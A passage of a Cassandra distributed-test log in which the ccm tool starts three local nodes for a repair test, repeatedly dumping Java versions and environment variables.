'/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node1/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6'}
10:15:02 08:15:02,669 ccm INFO node1: using Java 8 for the current invocation
10:15:02 08:15:02,669 ccm INFO node1: using Java 8 for the current invocation
10:15:02 08:15:02,735 ccm INFO Starting node1 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
10:15:02 08:15:02,735 ccm INFO Starting node1 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
10:15:02 08:15:02,973 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node2/conf'}
10:15:02 08:15:02,973 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node2/conf'}
10:15:02 08:15:02,974 ccm INFO node2: using Java 8 for the current invocation
10:15:02 08:15:02,974 ccm INFO node2: using Java 8 for the current invocation
10:15:02 08:15:03,152 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node2/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
10:15:03 08:15:03,152 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node2/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
10:15:03 08:15:03,152 ccm INFO node2: using Java 8 for the current invocation
10:15:03 08:15:03,152 ccm INFO node2: using Java 8 for the current invocation
10:15:03 08:15:03,235 ccm INFO Starting node2 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
10:15:03 08:15:03,235 ccm INFO Starting node2 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
10:15:03 08:15:03,468 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/conf'}
10:15:03 08:15:03,468 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 